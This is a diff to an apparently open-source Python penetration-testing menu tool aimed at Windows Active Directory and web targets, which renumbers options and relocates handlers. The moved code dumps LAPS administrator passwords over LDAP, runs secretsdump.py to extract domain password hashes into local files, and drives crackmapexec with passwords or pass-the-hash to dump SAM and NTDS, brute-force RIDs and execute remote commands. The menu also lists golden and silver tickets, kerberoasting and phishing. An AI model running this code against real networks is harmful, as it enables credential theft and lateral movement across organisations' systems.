@@ -780,16 +780,16 @@ def dispMenu():
    return
    
 def options():
-   print('\u2551' + "(01) Re/Set O/S FORMAT  (11) Re/Set DOMAINSID (31) Get Arch (41) WinLDAP Search (51) Kerberos Info (61) Kerb Ticket (71) ServScanner (81) gRPClient   (91 ) FTP      (231) Scan Live PORTS (341) Edit   Usernames (441) Whois DNS    (500) Nuclei Scanner (600) LFI OS Checker (700) Certipy VULN (710) Certipy ESC10    " + '\u2551')   
-   print('\u2551' + "(02) Re/Set DNS ADDRESS (12) Re/Set SUBDOMAIN (32) Net View (42) Look up SecIDs (52) Kerberos Auth (62) Silv Ticket (72) VulnScanner (82)             (92 ) SSH      (232) TCP PORTS  Scan (342) Edit   Passwords (442) Dig DNS      (501) Nuclei WP Scan (601) LFI   Wordlist (701) Certipy ESC1 (711) Certipy ESC11    " + '\u2551')      
-   print('\u2551' + "(03) Re/Set IP  ADDRESS (13) Re/Set FILE NAME (33) Services (43) Sam Dump Users (53) KerberosBrute (63) Gold Ticket (73) ExplScanner (83) GenSSHKeyID (93 ) SSHKeyID (233) UDP PORTS  Scan (343) Edit NTLM Hashes (443) Enum DOMAIN  (502) Wordpress Scan (602) Nuclei LFI     (702) Certipy ESC2                        " + '\u2551')   
-   print('\u2551' + "(04) Re/Set LIVE  PORTS (14) Re/Set SHARENAME (34) AT  Exec (44) REGistry Hives (54) KerbeRoasting (64) Gold DC PAC (74) Expl Finder (84) GenListUser (94 ) Telnet   (234) Basic Serv Scan (344) Edit   Host.conf (444) Recon DOMAIN (503) WP Plugin Scan (603)                (703) Certipy ESC3                        " + '\u2551')
-   print('\u2551' + "(05) Re/Set WEBSITE URL (15) Re/Set SERVERS   (35) DComExec (45) Enum EndPoints (55) ASREPRoasting (65) LAPS Dumper (75) ExplCreator (85) GenListPass (95 ) Netcat   (235) Light Serv Scan (345) Edit Resolv.conf (445) Enum Sub-DOM (504)                (604)                (704) Certipy ESC4                        " + '\u2551')
-   print('\u2551' + "(06) Re/Set USER   NAME (16) Re/Set REV SHELL (36) PS  Exec (46) Rpc ClientServ (56) PASSWORD2HASH (66) SecretsDump (76) Dir Listing (86) NTDSDECRYPT (96 ) MSSQL    (236) Heavy Serv Scan (346) Edit ProxyChains (446) EnumVirtHOST (505)                (605) Domain Dump    (705) Certipy ESC5                        " + '\u2551')
-   print('\u2551' + "(07) Re/Set PASS   WORD (17) Re/Set CHISEL64  (37) SMB Exec (47) Smb ClientServ (57) Pass the HASH (67) CrackMapExe (77) SNMP Walker (87) Hail! HYDRA (97 ) MySQL    (237)                 (347) Edit  Kerb5.conf (447) FUZZ Sub-DOM (506)                (606) Blood Hound    (706) Certipy ESC6                        " + '\u2551')
-   print('\u2551' + "(08) Re/Set NTLM   HASH (28) Re/Set Community (38) WMO Exec (48) Smb Map SHARES (58) OverPass HASH (68) PSExec HASH (78) ManPhishCod (88) RedisClient (98 ) WinRm    (238)                 (348)                  (448) HTTP GitDump (507)                (607) Neo4j Console  (707) Certipy ESC7                        " + '\u2551')
+   print('\u2551' + "(01) Re/Set O/S FORMAT  (11) Re/Set DOMAINSID (31) Get Arch (41) WinLDAP Search (51) Kerberos Info (61) Kerb Ticket (71) ServScanner (81) gRPClient   (91 ) FTP      (231) Scan Live PORTS (341) Edit   Usernames (441) Whois DNS    (500) Nuclei Scanner (600)                (700) Certipy VULN (710) Certipy ESC10    " + '\u2551')   
+   print('\u2551' + "(02) Re/Set DNS ADDRESS (12) Re/Set SUBDOMAIN (32) Net View (42) Look up SecIDs (52) Kerberos Auth (62) Silv Ticket (72) VulnScanner (82)             (92 ) SSH      (232) TCP PORTS  Scan (342) Edit   Passwords (442) Dig DNS      (501) Nuclei WP Scan (601)                (701) Certipy ESC1 (711) Certipy ESC11    " + '\u2551')      
+   print('\u2551' + "(03) Re/Set IP  ADDRESS (13) Re/Set FILE NAME (33) Services (43) Sam Dump Users (53) KerberosBrute (63) Gold Ticket (73) ExplScanner (83) GenSSHKeyID (93 ) SSHKeyID (233) UDP PORTS  Scan (343) Edit NTLM Hashes (443) Enum DOMAIN  (502) Wordpress Scan (602) LAPS    Dumper (702) Certipy ESC2                        " + '\u2551')   
+   print('\u2551' + "(04) Re/Set LIVE  PORTS (14) Re/Set SHARENAME (34) AT  Exec (44) REGistry Hives (54) KerbeRoasting (64) Gold DC PAC (74) Expl Finder (84) GenListUser (94 ) Telnet   (234) Basic Serv Scan (344) Edit   Host.conf (444) Recon DOMAIN (503) WP Plugin Scan (603) Secrets   Dump (703) Certipy ESC3                        " + '\u2551')
+   print('\u2551' + "(05) Re/Set WEBSITE URL (15) Re/Set SERVERS   (35) DComExec (45) Enum EndPoints (55) ASREPRoasting (65) Disp Ticket (75) ExplCreator (85) GenListPass (95 ) Netcat   (235) Light Serv Scan (345) Edit Resolv.conf (445) Enum Sub-DOM (504) LFI OS Checker (604) Crack-Map-Exec (704) Certipy ESC4                        " + '\u2551')
+   print('\u2551' + "(06) Re/Set USER   NAME (16) Re/Set REV SHELL (36) PS  Exec (46) Rpc ClientServ (56) PASSWORD2HASH (66)             (76) Dir Listing (86) NTDSDECRYPT (96 ) MSSQL    (236) Heavy Serv Scan (346) Edit ProxyChains (446) EnumVirtHOST (505) LFI   Wordlist (605) Domain    Dump (705) Certipy ESC5                        " + '\u2551')
+   print('\u2551' + "(07) Re/Set PASS   WORD (17) Re/Set CHISEL64  (37) SMB Exec (47) Smb ClientServ (57) Pass the HASH (67)             (77) SNMP Walker (87) Hail! HYDRA (97 ) MySQL    (237)                 (347) Edit  Kerb5.conf (447) FUZZ Sub-DOM (506)                (606) Blood    Hound (706) Certipy ESC6                        " + '\u2551')
+   print('\u2551' + "(08) Re/Set NTLM   HASH (28) Re/Set Community (38) WMO Exec (48) Smb Map SHARES (58) OverPass HASH (68) PSExec HASH (78) ManPhishCod (88) RedisClient (98 ) WinRm    (238)                 (348)                  (448) HTTP GitDump (507)                (607) Neo4j  Console (707) Certipy ESC7                        " + '\u2551')
    print('\u2551' + "(09) Re/Set TICKET NAME (29) Re/Set FUZZRIDER (39) NFS List (49) Smb Dump Files (59)               (69) SmbExecHASH (79) AutoPhisher (89) Remote Sync (99 ) RemDesk  (239)                 (349)                  (449)              (508)                (608) Neo4j Database (708) Certipy ESC8 (998) SSH Port Forward " + '\u2551')
-   print('\u2551' + "(10) Re/Set DOMAIN NAME (30) Re/Set WORD LIST (40) NFSMount (50) Smb MountSHARE (60) DisplayTicket (70) WmiExecHASH (80) MSF Console (90) Rsync Dumps (100) RDPBrute (240)                 (350)                  (450)              (509)                (609) BloodHound GUI (709) Certipy ESC9 (999)", end= ' ')
+   print('\u2551' + "(10) Re/Set DOMAIN NAME (30) Re/Set WORD LIST (40) NFSMount (50) Smb MountSHARE (60)               (70) WmiExecHASH (80) MSF Console (90) Rsync Dumps (100) RDPBrute (240)                 (350)                  (450)              (509)                (609) BloodHound GUI (709) Certipy ESC9 (999)", end= ' ')
    if proxyChains == 1:
       print(colored(menuName.rstrip(" "),colour0, attrs=['blink']), end= ' ' + "     " + '\u2551')
    else:
@@ -2562,20 +2562,7 @@ while True:
                TGT = privCheck()
          else:
             print("[+] TGT was not generated...")                              
-      prompt()
-      
-# ------------------------------------------------------------------------------------- 
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub
-# Version : TREADSTONE                                                             
-# Details : Menu option selected - Describe Ticket
-# Modified: N/A
-# -------------------------------------------------------------------------------------
-
-   if selection == '60':
-      localCOM(keyPath + "describeTicket.py " + TGT.rstrip(" ") + " > ticket.tmp")
-      catsFile("ticket.tmp")
-      prompt()      
+      prompt()     
       
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -2681,155 +2668,19 @@ while True:
          else:
             remoteCOM(keyPath + "goldenPac.py -dc-ip " + TIP.rstrip(" ") + " -target-ip " + TIP.rstrip(" ") + " " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") +"@" + DOM.rstrip(" "))
       prompt()    
-         
-# ------------------------------------------------------------------------------------- 
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub
-# Version : TREADSTONE
-# Details : Menu option selected - Laps Dumper
-# Details : OLD CODE- aclpwn - du neo4j password -f USER - d DOMAIN -sp PASSWORD -s IP.
-# Modified: N/A
-# -------------------------------------------------------------------------------------
-
-   if selection =='65':
-      checkParam != test_TIP()      
-      if checkParam != 1:
-         checkParam = test_DOM()  
-      if checkParam != 1:
-         try: 
-            s = Server(DOM.rstrip(" "), get_info=ALL) 
-            c = Connection(s, user=DOM.rstrip(" ") + "\\" + USR.rstrip(" "), password=PAS.rstrip(" "), authentication=NTLM, auto_bind=True)       
-            c.search(search_base=base_creator(DOM.strip(" ")), search_filter='(&(objectCategory=computer)(ms-MCS-AdmPwd=*))',attributes=['ms-MCS-AdmPwd','ms-Mcs-AdmPwdExpirationTime','cn'])
-            for entry in c.entries:
-               output = str(entry['cn']) +" "+ str(entry['ms-Mcs-AdmPwd'])
-               print(colored("\n" + output, colour6))
-         except:
-            print("[-] Looks like something is missing..")
-
-# OLD ACL PWN CODE      
-#         BH1 = input("[+] Enter Neo4j username: ")
-#         BH2 = input("[+] Enter Neo4j password: ")                  
-#         if BH1 != "" and BH2 != "":
-#            runCommand("aclpwn -du " + BH1 + " -dp " + BH2 + " -f " + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -sp " + PAS.rstrip(" ") + " -s " + TIP.rstrip(" "))
-#         else:
-#            print("[+] Username or password cannot be null...")            
-      prompt()
       
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : TREADSTONE                                                             
-# Details : Menu option selected - secretdump.py DOMAIN/USER:PASSWORD@IP.
+# Details : Menu option selected - Describe Ticket
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='66':
-      checkParam = test_TIP()      
-      if checkParam != 1:
-         checkParam = test_DOM()               
-      if checkParam != 1:
-         print(colored("[*] Enumerating, please wait...", colour3))         
-         if PAS[:2] != "''":
-            remoteCOM(keyPath + "secretsdump.py '" + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ") + "' > secrets.tmp")
-         else:
-            print("[i] Using HASH value as password credential...")
-            remoteCOM(keyPath + "secretsdump.py '" + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + "' -hashes ':" + NTM.rstrip(" ") + "' > secrets.tmp")                        
-         localCOM("sed -i '/:::/!d' secrets.tmp")
-         localCOM("sort -u secrets.tmp > ssecrets.tmp")         
-         count = lineCount("ssecrets.tmp")               	
-         if count > 0:               
-            localCOM("rm " + dataDir + "/usernames.txt")
-            localCOM("rm " + dataDir + "/hashes.txt")
-            wipeTokens(VALD)             
-            for x in range(0, count):
-               data = linecache.getline("ssecrets.tmp", x + 1)               
-               data = data.replace(":::","")               
-               try:
-                  get1,get2,get3,get4 = data.split(":") 
-               except ValueError:
-                  try:
-                     print(colored("[!] WARNING!!! - Huston, we encountered a problem while unpacking a hash value, but fixed it in situ... just letting you know!!...", colour0))
-                     get1, get2, get3 = data.split(":")
-                     get4 = get3
-                  except:
-                     get1 = "Major Error..."
-                     get2 = "Major Error..."
-                     get3 = "Major Error..."
-                     get4 = "Major Error..."                     
-               get1 = get1.rstrip("\n")
-               get2 = get1.rstrip("\n")
-               get3 = get1.rstrip("\n")
-               get4 = get4.rstrip("\n")                              
-               print(colored("[+] Found User " + get1,colour6))            
-               USER[x] = get1[:COL3]
-               HASH[x] = get4[:COL4]
-               USER[x] = spacePadding(USER[x], COL3)
-               HASH[x] = spacePadding(HASH[x], COL4)               
-               if USER[x][:1] != " ":
-                  localCOM("echo " + USER[x].rstrip(" ") + " >> " + dataDir + "/usernames.txt")
-                  localCOM("echo " + HASH[x].rstrip(" ") + " >> " + dataDir + "/hashes.txt")           
-         else:      
-            print("[+] No users were found. check the domain name is correct...")               
-      prompt()
-
-# ------------------------------------------------------------------------------------- 
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub
-# Version : TREADSTONE                                                             
-# Details : Menu option selected - crackmapexec smb IP -u Administrator -p password --lusers --local-auth --shares & H hash -x 'net user Administrator /domain'
-# Modified: crackmapexec currently (03/01/2021) has a python3 problem - so this is a work around that still does not terminate properly.
-# -------------------------------------------------------------------------------------
-
-   if selection =='67':
-      checkParam = test_TIP()      
-      if checkParam != 1:
-         checkParam = test_DOM()               
-      if checkParam != 1:      
-         if NTM[:5] == "EMPTY": # Then use IP
-            checkParam = test_PRT("5985")                                    
-            if checkParam != 1:
-               print("[+] Finding exploitable machines on the same subnet...\n")
-               remoteCOM("crackmapexec winrm " + TIP.rstrip(" ") + "/24")                         
-            checkParam = test_PRT("445")
-            if checkParam != 1:
-               print("\n[+] Checking priviliges...\n")
-               remoteCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -X whoami")
-               print("\n[+] Enumerating users...\n")
-               remoteCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' --users")               
-               print("\n[+] Enumerating shares...\n")
-               remoteCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' --shares")               
-               print("\n[+] Enumerating sessions...\n")
-               remoteCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' --sessions")               
-               print("\n[+] Enumerating SAM...\n")
-               remoteCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' --local-auth --sam")               
-               print("\n[+] Enumerating NTDS...\n")
-               remoteCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' --local-auth --ntds drsuapi")
-               print("\n[+] Performing rid brute...\n")
-               remoteCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' --rid-brute 20000")               
-         else:
-            print("[i] Using HASH value as password credential...")
-            checkParam = test_PRT("5985")
-            if checkParam != 1:
-               print("[+] Finding exploitable machines on the same subnet...\n")
-               remoteCOM("crackmapexec winrm " + TIP.rstrip(" ") + "/24")                    
-            checkParam = test_PRT("445")
-            if checkParam != 1:
-               print("\n[+] Checking priviliges...\n")
-               remoteCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") + "' -X whoami")
-               print("\n[+] Enumerating users...\n")
-               remoteCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") + "' --users")               
-               print("\n[+] Enumerating shares...\n")
-               remoteCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") + "' --shares")               
-               print("\n[+] Enumerating sessions...\n")
-               remoteCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") + "' --sessions")               
-               print("\n[+] Enumerating SAM...\n")
-               remoteCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") + "' --local-auth --sam")               
-               print("\n[+] Enumerating NTDS...\n")
-               remoteCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") + "' --local-auth --ntds drsuapi")
-               print("\n[+] Performing rid brute...\n")
-               remoteCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") + "' --rid-brute 20000")
-      print("KNOWN CODING ERROR _ CRACKMAPEXEC EOF TERMINATION")         
-      prompt()
+   if selection == '65':
+      localCOM(keyPath + "describeTicket.py " + TGT.rstrip(" ") + " > ticket.tmp")
+      catsFile("ticket.tmp")
+      prompt() 
                
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -4183,7 +4034,7 @@ while True:
    if selection == '503':
       print(colored("[*] Scanning for Wordpress Plugins...", colour3))   
       remoteCOM("wpscan --url " + WEB.rstrip(" ") + "  --enumerate u,ap,vt,dbe,cb --plugins-detection mixed")
-      prompt()          
+      prompt()
       
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -4193,7 +4044,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '600':
+   if selection == '504':
       checkParams = test_WEB()
       if checkParams != 1:
          print(colored("[*] Using webpage LFI to enumerate files...", colour3))   
@@ -4237,7 +4088,7 @@ while True:
          else:
             print("[-] Unknown operating system...")          
          remoteCOM("cd ..")
-      prompt()   
+      prompt()             
       
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -4247,7 +4098,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '601':
+   if selection == '505':
       checkParams = test_WEB()
       os.chdir(workDir)
       if checkParams != 1:
@@ -4272,14 +4123,150 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : TREADSTONE                                                             
-# Details : Menu option selected -NUCLEUI SCAN
+# Version : TREADSTONE
+# Details : Menu option selected - Laps Dumper
+# Details : OLD CODE- aclpwn - du neo4j password -f USER - d DOMAIN -sp PASSWORD -s IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '602':
-      print(colored("[*] Scanning webpage...", colour3))   
-      remoteCOM("nuclei -target " + WEB.rstrip("") + " --tags LFI")
+   if selection =='602':
+      checkParam != test_TIP()      
+      if checkParam != 1:
+         checkParam = test_DOM()  
+      if checkParam != 1:
+         try: 
+            s = Server(DOM.rstrip(" "), get_info=ALL) 
+            c = Connection(s, user=DOM.rstrip(" ") + "\\" + USR.rstrip(" "), password=PAS.rstrip(" "), authentication=NTLM, auto_bind=True)       
+            c.search(search_base=base_creator(DOM.strip(" ")), search_filter='(&(objectCategory=computer)(ms-MCS-AdmPwd=*))',attributes=['ms-MCS-AdmPwd','ms-Mcs-AdmPwdExpirationTime','cn'])
+            for entry in c.entries:
+               output = str(entry['cn']) +" "+ str(entry['ms-Mcs-AdmPwd'])
+               print(colored("\n" + output, colour6))
+         except:
+            print("[-] Looks like something is missing..")
+
+# OLD ACL PWN CODE      
+#         BH1 = input("[+] Enter Neo4j username: ")
+#         BH2 = input("[+] Enter Neo4j password: ")                  
+#         if BH1 != "" and BH2 != "":
+#            runCommand("aclpwn -du " + BH1 + " -dp " + BH2 + " -f " + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -sp " + PAS.rstrip(" ") + " -s " + TIP.rstrip(" "))
+#         else:
+#            print("[+] Username or password cannot be null...")            
+      prompt()
+      
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : TREADSTONE                                                             
+# Details : Menu option selected - secretdump.py DOMAIN/USER:PASSWORD@IP.
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection =='603':
+      checkParam = test_TIP()      
+      if checkParam != 1:
+         checkParam = test_DOM()               
+      if checkParam != 1:
+         print(colored("[*] Enumerating, please wait...", colour3))         
+         if PAS[:2] != "''":
+            remoteCOM(keyPath + "secretsdump.py '" + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ") + "' > secrets.tmp")
+         else:
+            print("[i] Using HASH value as password credential...")
+            remoteCOM(keyPath + "secretsdump.py '" + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + "' -hashes ':" + NTM.rstrip(" ") + "' > secrets.tmp")                        
+         localCOM("sed -i '/:::/!d' secrets.tmp")
+         localCOM("sort -u secrets.tmp > ssecrets.tmp")         
+         count = lineCount("ssecrets.tmp")               	
+         if count > 0:               
+            localCOM("rm " + dataDir + "/usernames.txt")
+            localCOM("rm " + dataDir + "/hashes.txt")
+            wipeTokens(VALD)             
+            for x in range(0, count):
+               data = linecache.getline("ssecrets.tmp", x + 1)               
+               data = data.replace(":::","")               
+               try:
+                  get1,get2,get3,get4 = data.split(":") 
+               except ValueError:
+                  try:
+                     print(colored("[!] WARNING!!! - Huston, we encountered a problem while unpacking a hash value, but fixed it in situ... just letting you know!!...", colour0))
+                     get1, get2, get3 = data.split(":")
+                     get4 = get3
+                  except:
+                     get1 = "Major Error..."
+                     get2 = "Major Error..."
+                     get3 = "Major Error..."
+                     get4 = "Major Error..."                     
+               get1 = get1.rstrip("\n")
+               get2 = get1.rstrip("\n")
+               get3 = get1.rstrip("\n")
+               get4 = get4.rstrip("\n")                              
+               print(colored("[+] Found User " + get1,colour6))            
+               USER[x] = get1[:COL3]
+               HASH[x] = get4[:COL4]
+               USER[x] = spacePadding(USER[x], COL3)
+               HASH[x] = spacePadding(HASH[x], COL4)               
+               if USER[x][:1] != " ":
+                  localCOM("echo " + USER[x].rstrip(" ") + " >> " + dataDir + "/usernames.txt")
+                  localCOM("echo " + HASH[x].rstrip(" ") + " >> " + dataDir + "/hashes.txt")           
+         else:      
+            print("[+] No users were found. check the domain name is correct...")               
+      prompt()
+
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : TREADSTONE                                                             
+# Details : Menu option selected - crackmapexec smb IP -u Administrator -p password --lusers --local-auth --shares & H hash -x 'net user Administrator /domain'
+# Modified: crackmapexec currently (03/01/2021) has a python3 problem - so this is a work around that still does not terminate properly.
+# -------------------------------------------------------------------------------------
+
+   if selection =='604':
+      checkParam = test_TIP()      
+      if checkParam != 1:
+         checkParam = test_DOM()               
+      if checkParam != 1:      
+         if NTM[:5] == "EMPTY": # Then use IP
+            checkParam = test_PRT("5985")                                    
+            if checkParam != 1:
+               print("[+] Finding exploitable machines on the same subnet...\n")
+               remoteCOM("crackmapexec winrm " + TIP.rstrip(" ") + "/24")                         
+            checkParam = test_PRT("445")
+            if checkParam != 1:
+               print("\n[+] Checking priviliges...\n")
+               remoteCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -X whoami")
+               print("\n[+] Enumerating users...\n")
+               remoteCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' --users")               
+               print("\n[+] Enumerating shares...\n")
+               remoteCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' --shares")               
+               print("\n[+] Enumerating sessions...\n")
+               remoteCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' --sessions")               
+               print("\n[+] Enumerating SAM...\n")
+               remoteCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' --local-auth --sam")               
+               print("\n[+] Enumerating NTDS...\n")
+               remoteCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' --local-auth --ntds drsuapi")
+               print("\n[+] Performing rid brute...\n")
+               remoteCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' --rid-brute 20000")               
+         else:
+            print("[i] Using HASH value as password credential...")
+            checkParam = test_PRT("5985")
+            if checkParam != 1:
+               print("[+] Finding exploitable machines on the same subnet...\n")
+               remoteCOM("crackmapexec winrm " + TIP.rstrip(" ") + "/24")                    
+            checkParam = test_PRT("445")
+            if checkParam != 1:
+               print("\n[+] Checking priviliges...\n")
+               remoteCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") + "' -X whoami")
+               print("\n[+] Enumerating users...\n")
+               remoteCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") + "' --users")               
+               print("\n[+] Enumerating shares...\n")
+               remoteCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") + "' --shares")               
+               print("\n[+] Enumerating sessions...\n")
+               remoteCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") + "' --sessions")               
+               print("\n[+] Enumerating SAM...\n")
+               remoteCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") + "' --local-auth --sam")               
+               print("\n[+] Enumerating NTDS...\n")
+               remoteCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") + "' --local-auth --ntds drsuapi")
+               print("\n[+] Performing rid brute...\n")
+               remoteCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") + "' --rid-brute 20000")
+      print("KNOWN CODING ERROR _ CRACKMAPEXEC EOF TERMINATION")         
       prompt()     
       
 # ------------------------------------------------------------------------------------- 
